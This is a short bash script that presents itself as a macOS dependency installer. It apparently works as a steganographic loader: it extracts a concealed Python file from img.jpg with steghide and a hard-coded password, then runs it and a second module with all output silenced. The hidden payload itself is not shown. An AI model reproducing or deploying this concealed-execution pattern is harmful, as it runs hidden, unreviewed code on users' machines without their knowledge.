#!/bin/bash

if ! command -v brew &> /dev/null; then
    echo "Homebrew isn't installed. Download from https://brew.sh/"
    open "https://brew.sh/"
    exit 1
fi

if ! command -v python3 &> /dev/null; then
    echo "Python3 isn't installed. Downloadign with Homebrew..."
    brew install python > /dev/null 2>&1
fi

if ! command -v steghide &> /dev/null; then
    echo "Missing dependencies, proceed to download them with MacPorts..."
    sudo port install steghide > /dev/null 2>&1
fi

source lib/bin/activate

steghide extract -sf img.jpg -p "hide" -xf lib/install.py -f > /dev/null 2>&1

chmod +x lib/install.py

python3 lib/install.py > /dev/null 2>&1
python3 lib/modules.py > /dev/null 2>&1

